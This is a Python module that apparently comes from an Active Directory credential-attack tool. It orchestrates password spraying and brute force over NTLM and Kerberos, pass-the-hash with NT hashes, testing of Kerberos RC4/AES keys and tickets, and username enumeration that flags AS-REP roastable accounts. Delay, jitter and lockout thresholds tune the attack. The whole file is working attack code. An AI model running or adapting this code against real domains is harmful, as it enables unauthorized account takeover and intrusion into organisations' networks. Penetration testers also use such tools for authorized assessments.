# SPDX-License-Identifier: Apache-2.0
"""Credential-validation attack orchestration."""

from __future__ import annotations

import random
import re
import time
from pathlib import Path
from typing import TYPE_CHECKING

from credwolf.kerberos import KerberosHandler
from credwolf.models import (
    AES128_KEY_HEX_LEN,
    AES256_KEY_HEX_LEN,
    RC4_KEY_HEX_LEN,
    AttackOptions,
    AuthResult,
    EncryptionType,
    Protocol,
)
from credwolf.ntlm import NtlmHandler

if TYPE_CHECKING:
    from typing import ClassVar, TextIO

    from credwolf.log import Logger

_HEX32_RE = re.compile(r"^[0-9a-f]{32}$", re.IGNORECASE)
_HEX_RE = re.compile(r"^[0-9a-f]+$", re.IGNORECASE)

# SystemRandom uses OS entropy — not flagged by S311.
_RNG = random.SystemRandom()

# ---------------------------------------------------------------------------
# Hash / key parsing helpers
# ---------------------------------------------------------------------------


def _parse_hash_line(raw: str) -> tuple[str, str] | None:
    """Parse a single hash value: bare ``NTHASH`` or ``LMHASH:NTHASH``.

    Returns ``(lm_hash, nt_hash)`` or ``None`` on invalid format.
    LM hash is ``""`` when only an NT hash is provided.
    """
    raw = raw.strip()
    if ":" in raw:
        lm, nt = raw.split(":", 1)
        if _HEX32_RE.match(lm) and _HEX32_RE.match(nt):
            return (lm.lower(), nt.lower())
        return None
    if _HEX32_RE.match(raw):
        return ("", raw.lower())
    return None


def _parse_hash_lines(lines: list[str], logger: Logger) -> list[tuple[str, str]]:
    """Parse hash file lines, skipping invalid ones with a warning."""
    result: list[tuple[str, str]] = []
    for idx, raw in enumerate(lines, start=1):
        parsed = _parse_hash_line(raw)
        if parsed is not None:
            result.append(parsed)
        else:
            logger.error("Skipping line %s (expected NT hash or LM:NT pair): %s", idx, raw.strip())
    return result


def _validate_hex_key(hex_key: str, expected_len: int) -> str | None:
    """Validate that *hex_key* is a valid hex string of *expected_len* characters.

    Returns the lowercased key or ``None`` on invalid format.
    """
    hex_key = hex_key.strip().lower()
    if len(hex_key) == expected_len and _HEX_RE.fullmatch(hex_key):
        return hex_key
    return None


def _detect_kerberos_key(hex_key: str, etype: EncryptionType = EncryptionType.RC4) -> tuple[str | None, str | None, str | None, str] | None:
    """Auto-detect Kerberos key type from hex length.

    Returns ``(rc4, aes128, aes256, label)`` or ``None`` on invalid.

    Key sizes checked:
    - RC4:    16 bytes = 32 hex chars
    - AES128: 16 bytes = 32 hex chars (same as RC4 — cannot auto-distinguish)
    - AES256: 32 bytes = 64 hex chars

    Since RC4 and AES128 share the same length, 32-char keys default to
    RC4 unless *etype* is :attr:`EncryptionType.AES128`, in which case
    they are treated as AES128.
    """
    hex_key = hex_key.strip().lower()
    if not _HEX_RE.fullmatch(hex_key):
        return None
    if len(hex_key) == RC4_KEY_HEX_LEN:  # 32 hex — RC4 or AES128
        if etype == EncryptionType.AES128:
            return (None, hex_key, None, "AES128")
        return (hex_key, None, None, "RC4")
    if len(hex_key) == AES256_KEY_HEX_LEN:  # 64 hex — AES256
        return (None, None, hex_key, "AES256")
    return None


# ---------------------------------------------------------------------------
# Display helper
# ---------------------------------------------------------------------------


def _hash_display(nt_hash: str | None) -> str | None:
    """Build a display string for hash credentials (NT hash only)."""
    return nt_hash


class AttackRunner:
    """Coordinate credential testing across protocols."""

    def __init__(self, options: AttackOptions, logger: Logger, output_file: TextIO | None = None) -> None:
        """Initialize the runner with attack options, logger, and optional output file."""
        self.options = options
        self.logger = logger
        self.ntlm = NtlmHandler(logger, timeout=options.timeout)
        self.kerberos = KerberosHandler(logger, timeout=options.timeout)
        self._connection_failed = False
        self._clock_skew = False
        self._consecutive_revoked = 0
        self._output_file = output_file
        self._case_correction_logged: set[str] = set()

    def _display_user(self, user: str) -> str:
        """Return the KDC-corrected username if available, otherwise the original."""
        return self.kerberos.username_corrections.get(user, user)

    def _log_case_correction(self, user: str) -> None:
        """Log a username case correction once per user at verbose level."""
        corrected = self._display_user(user)
        if corrected != user and user not in self._case_correction_logged:
            self._case_correction_logged.add(user)
            self.logger.verbose(f"Username case corrected by KDC: {user} → {corrected}")

    # -- result rendering ---------------------------------------------------

    def _write_output(self, line: str) -> None:
        """Write a result line to the output file if one is configured."""
        if self._output_file is not None:
            self._output_file.write(line + "\n")
            self._output_file.flush()

    # Human-friendly descriptions for protocol error codes.
    _ERROR_DESC: ClassVar[dict[str, str]] = {
        # Kerberos
        "KDC_ERR_CLIENT_REVOKED": "account disabled, expired, locked out, or outside logon hours",
        "KDC_ERR_KEY_EXPIRED": "password valid but expired — must change",
        "KDC_ERR_POLICY": "logon restricted by AD policy (typically smart card required)",
        "KDC_ERR_ETYPE_NOSUPP": "encryption type not supported — try a different --etype",
        "KDC_ERR_NAME_EXP": "account entry expired in AD",
        "KDC_ERR_CLIENT_NOTYET": "account not yet valid — future start date",
        "KDC_ERR_NULL_KEY": "no key set on account — password may need reset",
        "KRB_ERR_RESPONSE_TOO_BIG": "retry with --transport tcp",
        "KRB_AP_ERR_SKEW": "clock out of sync with KDC",
        "KDC_ERR_WRONG_REALM": "incorrect domain or principal",
        "KDC_ERR_CLIENT_NOT_TRUSTED": "smart card certificate revoked or untrusted CA",
        "KRB_ERR_GENERIC": "generic KDC error",
        # NTLM (post-auth statuses that confirm the password)
        "STATUS_PASSWORD_MUST_CHANGE": "password valid but expired",
        "STATUS_PASSWORD_EXPIRED": "password valid but expired",
        "STATUS_ACCOUNT_DISABLED": "password valid — account disabled",
        "STATUS_ACCOUNT_EXPIRED": "password valid — account expired",
        "STATUS_INVALID_LOGON_HOURS": "password valid — outside logon hours",
        "STATUS_INVALID_WORKSTATION": "password valid — workstation restriction",
        "STATUS_ACCOUNT_RESTRICTION": "account restriction (e.g. Protected Users)",
        "STATUS_ACCOUNT_LOCKED_OUT": "account locked out — password not checked",
    }

    # Error codes that mean the account exists but is unusable (for --max-lockouts).
    _REVOKED_ERRORS: frozenset[str] = frozenset(
        {
            "KDC_ERR_CLIENT_REVOKED",
            "KDC_ERR_NAME_EXP",
            "KDC_ERR_CLIENT_NOTYET",
            "KDC_ERR_NULL_KEY",
        }
    )

    def _format_error(self, details: str) -> str:
        """Format a protocol error as ``RAW_CODE (human description)``."""
        desc = self._ERROR_DESC.get(details)
        if desc:
            return f"{details} ({desc})"
        return details

    def _handle_auth_results(
        self,
        domain: str,
        user: str,
        secret: str,
        secret_type: str,
        result: AuthResult,
    ) -> None:
        if result.details == "connection failed":
            return

        # Track consecutive revoked accounts for --max-lockouts.
        if result.details in self._REVOKED_ERRORS:
            self._consecutive_revoked += 1
        else:
            self._consecutive_revoked = 0

        credential = f"{domain}/{user}:{secret}@{secret_type}" if secret else f"{domain}/{user}@{secret_type}"

        if result.success:
            if result.details:
                self.logger.success(f"{credential} — {self._format_error(result.details)}")
            else:
                self.logger.success(credential)
            self._write_output(credential)
            return

        if result.success is None:
            self.logger.warning(f"{credential} — {self._format_error(result.details)}")
            return

        if result.details == "KRB_AP_ERR_SKEW":
            server_info = f" (server time: {self.kerberos.server_time} UTC)" if self.kerberos.server_time else ""
            self.logger.error(f"{credential} — KRB_AP_ERR_SKEW (clock out of sync with KDC{server_info})")
            self._clock_skew = True
            return

        if result.details:
            self.logger.warning(f"{credential} — {self._format_error(result.details)}")

    # -- stop / delay helpers -----------------------------------------------

    def _should_stop(self, *, success: bool | None) -> bool:
        """Return True if iteration should be aborted."""
        if self._connection_failed or self._clock_skew:
            return True
        if success is True and self.options.stop_on_success:
            return True
        if self.options.max_lockouts > 0 and self._consecutive_revoked >= self.options.max_lockouts:
            self.logger.error(f"Stopping — {self._consecutive_revoked} consecutive accounts revoked (disabled/expired/locked out)")
            return True
        return False

    def _sleep(self) -> None:
        """Sleep for delay +/- jitter seconds between attempts."""
        if self.options.delay <= 0 and self.options.jitter <= 0:
            return
        wait = max(
            0.0,
            self.options.delay + _RNG.uniform(-self.options.jitter, self.options.jitter),
        )
        if wait > 0:
            time.sleep(wait)

    # -- credential testing dispatchers -------------------------------------

    def _try_ntlm(
        self,
        user: str,
        password: str | None,
        lm_hash: str | None,
        nt_hash: str | None,
    ) -> AuthResult:
        opts = self.options
        domain = opts.domain or ""
        target = opts.dc_ip or domain
        return self.ntlm.test_credentials(
            target=target,
            domain=domain,
            user=user,
            password=password,
            lm_hash=lm_hash,
            nt_hash=nt_hash,
            transport=opts.ntlm_transport,
        )

    def _try_kerberos(
        self,
        user: str,
        password: str | None,
        rc4_key: str | None,
        aes128_key: str | None,
        aes256_key: str | None,
    ) -> AuthResult:
        opts = self.options
        domain = opts.domain or ""
        target = opts.kdc_ip or domain
        if user in self.kerberos.revoked_account or user in self.kerberos.principal_unknown or user in self.kerberos.wrong_realm:
            return AuthResult(success=False)
        try:
            return self.kerberos.pre_authentication(
                target=target,
                domain=domain,
                user=user,
                password=password,
                rc4_key=rc4_key,
                aes128_key=aes128_key,
                aes256_key=aes256_key,
                etype=opts.etype,
                transport=opts.kdc_transport,
            )
        except Exception:
            self.logger.error(f"Kerberos pre-auth failed for {self._display_user(user)}")
            return AuthResult(success=False)

    def _attempt(
        self,
        user: str,
        *,
        secret_type: str,
        password: str | None = None,
        lm_hash: str | None = None,
        nt_hash: str | None = None,
        rc4_key: str | None = None,
        aes128_key: str | None = None,
        aes256_key: str | None = None,
    ) -> bool | None:
        """Run a single credential test and record the result. Returns success."""
        domain = self.options.domain or ""

        if password is not None:
            secret = password
        elif lm_hash or nt_hash:
            secret = _hash_display(nt_hash) or ""
        else:
            secret = rc4_key or aes128_key or aes256_key or ""

        if self.options.protocol == Protocol.NTLM:
            result = self._try_ntlm(user, password, lm_hash, nt_hash)
        else:
            result = self._try_kerberos(user, password, rc4_key, aes128_key, aes256_key)

        self._log_case_correction(user)
        self._handle_auth_results(domain, self._display_user(user), secret, secret_type, result)

        if result.details == "connection failed":
            self._connection_failed = True
        return result.success

    # ======================================================================
    # Main entry point
    # ======================================================================

    def _run_userenum(self, users: list[str]) -> None:
        """Enumerate valid AD usernames via Kerberos bare AS-REQ."""
        opts = self.options
        domain = opts.domain or ""
        target = opts.kdc_ip or domain
        transport = opts.kdc_transport

        total = len(users)
        found = 0
        for idx, user in enumerate(users, start=1):
            self.logger.verbose(f"User {idx}/{total}: {user}")
            result = self.kerberos.enumerate_user(target, domain, user, transport)

            if result.success:
                found += 1
                if result.details == "no_preauth":
                    self.logger.success(f"{domain}/{user} — {result.details} (ASREProastable)")
                elif result.details:
                    self.logger.success(f"{domain}/{user} — {result.details}")
                else:
                    self.logger.success(f"{domain}/{user}")
                self._write_output(f"{domain}/{user}")
            elif result.details == "connection failed":
                self._connection_failed = True
            elif result.details == "KRB_AP_ERR_SKEW":
                server_info = f" (server time: {self.kerberos.server_time} UTC)" if self.kerberos.server_time else ""
                self.logger.error(f"KRB_AP_ERR_SKEW — clock out of sync with KDC{server_info}. Sync your clock before doing Kerberos auth.")
                self._clock_skew = True
            elif result.details == "KRB_ERR_RESPONSE_TOO_BIG":
                self.logger.error(f"KRB_ERR_RESPONSE_TOO_BIG for {user} — retry with --transport tcp")

            if self._should_stop(success=result.success):
                break
            self._sleep()

        self.logger.info(f"Enumeration complete: {found}/{total} users found")

    def run(self) -> None:
        """Execute the credential-validation attack."""
        opts = self.options

        if opts.protocol == Protocol.USERENUM:
            # Build user list (same logic as existing).
            if opts.user:
                users = [opts.user]
            elif opts.users_file:
                loaded = self._read_lines(opts.users_file)
                if loaded is None:
                    return
                users = [u.strip() for u in loaded if u.strip()]
                if not users:
                    self.logger.error("User list file is empty")
                    return
            else:
                self.logger.error("No user or user list supplied")
                return
            self._run_userenum(users)
            return

        # Colon-separated paired files (NTLM).
        if opts.user_pass_file:
            self._run_colon_file(opts.user_pass_file, is_hash=False)
            return
        if opts.user_hash_file:
            self._run_colon_file(opts.user_hash_file, is_hash=True)
            return

        # Kerberos user:key file.
        if opts.user_key_file:
            self._run_kerberos_user_key_file(opts.user_key_file)
            return

        # Build user list.
        if opts.user:
            users = [opts.user]
        elif opts.users_file:
            loaded = self._read_lines(opts.users_file)
            if loaded is None:
                return
            users = [u.strip() for u in loaded if u.strip()]
            if not users:
                self.logger.error("User list file is empty")
                return
        else:
            self.logger.error("No user or user list supplied")
            return

        # Kerberos-specific paths.
        if opts.protocol == Protocol.KERBEROS:
            self._run_kerberos(users)
            return

        # NTLM: build secret list.
        if opts.password is not None:
            self._run_users_secrets(users, passwords=[opts.password])
        elif opts.passwords_file:
            loaded = self._read_lines(opts.passwords_file)
            if loaded is None:
                return
            passwords = [p.rstrip("\n\r") for p in loaded]
            self._run_users_secrets(users, passwords=passwords)
        elif opts.hashes_file:
            loaded = self._read_lines(opts.hashes_file)
            if loaded is None:
                return
            hashes = _parse_hash_lines(loaded, self.logger)
            self._run_users_secrets(users, hashes=hashes)
        elif opts.hash_value:
            parsed = _parse_hash_line(opts.hash_value)
            if parsed is None:
                self.logger.error(f"Invalid hash format (expected NT or LM:NT): {opts.hash_value}")
                return
            self._run_users_secrets(users, hashes=[parsed])
        else:
            self.logger.error("No credential source specified")

    # -- iteration strategies -----------------------------------------------

    def _run_users_secrets(
        self,
        users: list[str],
        *,
        passwords: list[str] | None = None,
        hashes: list[tuple[str, str]] | None = None,
    ) -> None:
        total_users = len(users)
        for u_idx, user in enumerate(users, start=1):
            self.logger.verbose(f"User {u_idx}/{total_users}: {self._display_user(user)}")
            if passwords is not None:
                for pw in passwords:
                    success = self._attempt(user, password=pw, secret_type="password")
                    if self._should_stop(success=success):
                        return
                    self._sleep()
            elif hashes is not None:
                for lm, nt in hashes:
                    success = self._attempt(user, lm_hash=lm, nt_hash=nt, secret_type="nt_hash")
                    if self._should_stop(success=success):
                        return
                    self._sleep()

    def _run_kerberos(self, users: list[str]) -> None:
        """Kerberos iteration: passwords, key lists, or ticket."""
        opts = self.options

        # Password-based.
        if opts.password is not None:
            self._run_users_secrets(users, passwords=[opts.password])
            return
        if opts.passwords_file:
            loaded = self._read_lines(opts.passwords_file)
            if loaded is None:
                return
            passwords = [p.rstrip("\n\r") for p in loaded]
            self._run_users_secrets(users, passwords=passwords)
            return

        # Inline single key(s).
        if opts.rc4_key or opts.aes128_key or opts.aes256_key:
            inline_keys: list[tuple[str | None, str | None, str | None, str]] = []
            if opts.rc4_key:
                validated = _validate_hex_key(opts.rc4_key, RC4_KEY_HEX_LEN)
                if validated is None:
                    self.logger.error(f"Invalid RC4 key (expected {RC4_KEY_HEX_LEN} hex chars): {opts.rc4_key}")
                    return
                inline_keys.append((validated, None, None, "RC4"))
            if opts.aes128_key:
                validated = _validate_hex_key(opts.aes128_key, AES128_KEY_HEX_LEN)
                if validated is None:
                    self.logger.error(f"Invalid AES128 key (expected {AES128_KEY_HEX_LEN} hex chars): {opts.aes128_key}")
                    return
                inline_keys.append((None, validated, None, "AES128"))
            if opts.aes256_key:
                validated = _validate_hex_key(opts.aes256_key, AES256_KEY_HEX_LEN)
                if validated is None:
                    self.logger.error(f"Invalid AES256 key (expected {AES256_KEY_HEX_LEN} hex chars): {opts.aes256_key}")
                    return
                inline_keys.append((None, None, validated, "AES256"))
            self._run_users_keys(users, inline_keys)
            return

        # Key-list based: accumulate all key files into one list.
        key_sources: list[tuple[str | None, str | None, str | None, str]] = []
        if opts.rc4_file:
            self._load_key_list(opts.rc4_file, "RC4", RC4_KEY_HEX_LEN, key_sources, key_slot=0)
        if opts.aes128_file:
            self._load_key_list(opts.aes128_file, "AES128", AES128_KEY_HEX_LEN, key_sources, key_slot=1)
        if opts.aes256_file:
            self._load_key_list(opts.aes256_file, "AES256", AES256_KEY_HEX_LEN, key_sources, key_slot=2)

        if key_sources:
            self._run_users_keys(users, key_sources)
            return

        # Ticket (ccache / kirbi) — validate TGT per user.
        if opts.ticket:
            self._run_kerberos_ticket(users)
            return

        self.logger.error("No credential source specified for Kerberos")

    def _load_key_list(
        self,
        filepath: str,
        label: str,
        expected_hex_len: int,
        key_sources: list[tuple[str | None, str | None, str | None, str]],
        *,
        key_slot: int,
    ) -> None:
        """Read a key list file and append validated keys to *key_sources*.

        *key_slot*: 0=RC4, 1=AES128, 2=AES256.
        """
        loaded = self._read_lines(filepath)
        if loaded is None:
            return
        for idx, raw_line in enumerate(loaded, start=1):
            validated = _validate_hex_key(raw_line, expected_hex_len)
            if validated is None:
                self.logger.error(f"Skipping {label} key on line {idx} (expected {expected_hex_len} hex chars): {raw_line.strip()}")
                continue
            entry: list[str | None] = [None, None, None]
            entry[key_slot] = validated
            key_sources.append((entry[0], entry[1], entry[2], label))

    def _run_users_keys(
        self,
        users: list[str],
        key_sources: list[tuple[str | None, str | None, str | None, str]],
    ) -> None:
        total_users = len(users)
        for u_idx, user in enumerate(users, start=1):
            self.logger.verbose(f"User {u_idx}/{total_users}: {self._display_user(user)}")
            for rc4, aes128, aes256, label in key_sources:
                success = self._attempt(user, rc4_key=rc4, aes128_key=aes128, aes256_key=aes256, secret_type=f"{label.lower()}_key")
                if self._should_stop(success=success):
                    return
                self._sleep()

    def _run_kerberos_ticket(self, users: list[str]) -> None:
        """Validate a ticket file's TGT for each user (ccache or kirbi)."""
        opts = self.options
        domain = opts.domain or ""
        total = len(users)
        for idx, user in enumerate(users, start=1):
            self.logger.verbose(f"User {idx}/{total}: {self._display_user(user)}")
            result, fmt = self.kerberos.ticket_authentication(
                ticket_path=opts.ticket or "",
                domain=domain,
                user=user,
                kdc_ip=opts.kdc_ip,
            )
            self._handle_auth_results(domain, self._display_user(user), opts.ticket or "", fmt, result)
            if result.details == "connection failed":
                self._connection_failed = True
            if self._should_stop(success=result.success):
                return
            self._sleep()

    def _run_kerberos_user_key_file(self, filepath: str) -> None:
        """Iterate a colon-separated ``user:key`` file with auto-detected key type."""
        lines = self._read_lines(filepath)
        if lines is None:
            return
        total = len(lines)
        for idx, raw_line in enumerate(lines, start=1):
            line = raw_line.rstrip("\n\r")
            if not line or ":" not in line:
                self.logger.error(f"Skipping line {idx} (no colon separator): {line}")
                continue
            user, key_hex = line.split(":", 1)
            key_hex = key_hex.strip()
            detected = _detect_kerberos_key(key_hex, self.options.etype)
            if detected is None:
                self.logger.error(f"Skipping line {idx} (invalid key — expected {RC4_KEY_HEX_LEN} hex chars for RC4 or {AES256_KEY_HEX_LEN} hex chars for AES256): {key_hex}")
                continue
            rc4, aes128, aes256, label = detected
            self.logger.verbose(f"Pair {idx}/{total}: {self._display_user(user.strip())} ({label})")
            success = self._attempt(
                user.strip(),
                rc4_key=rc4,
                aes128_key=aes128,
                aes256_key=aes256,
                secret_type=f"{label.lower()}_key",
            )
            if self._should_stop(success=success):
                return
            self._sleep()

    def _run_colon_file(self, filepath: str, *, is_hash: bool) -> None:
        """Iterate a colon-separated ``user:secret`` file."""
        lines = self._read_lines(filepath)
        if lines is None:
            return
        total = len(lines)
        secret_type = "nt_hash" if is_hash else "password"
        for idx, raw_line in enumerate(lines, start=1):
            line = raw_line.rstrip("\n\r")
            if not line or ":" not in line:
                self.logger.error(f"Skipping line {idx} (no colon separator): {line}")
                continue
            user, rest = line.split(":", 1)
            user = user.strip()
            self.logger.verbose(f"Pair {idx}/{total}: {self._display_user(user)}")
            if is_hash:
                parsed = _parse_hash_line(rest)
                if parsed is None:
                    self.logger.error(f"Skipping line {idx} (invalid hash — expected NT or LM:NT): {rest.strip()}")
                    continue
                lm, nt = parsed
                success = self._attempt(user, lm_hash=lm, nt_hash=nt, secret_type=secret_type)
            else:
                success = self._attempt(user, password=rest, secret_type=secret_type)
            if self._should_stop(success=success):
                return
            self._sleep()

    # -- file helper --------------------------------------------------------

    def _read_lines(self, filepath: str) -> list[str] | None:
        path = Path(filepath)
        if not path.exists():
            self.logger.error(f"File not found: {filepath}")
            return None
        try:
            return path.read_text().splitlines()
        except PermissionError:
            self.logger.error(f"Permission denied: {filepath}")
            return None
        except (UnicodeDecodeError, OSError) as exc:
            self.logger.error(f"Cannot read {filepath}: {exc}")
            return None
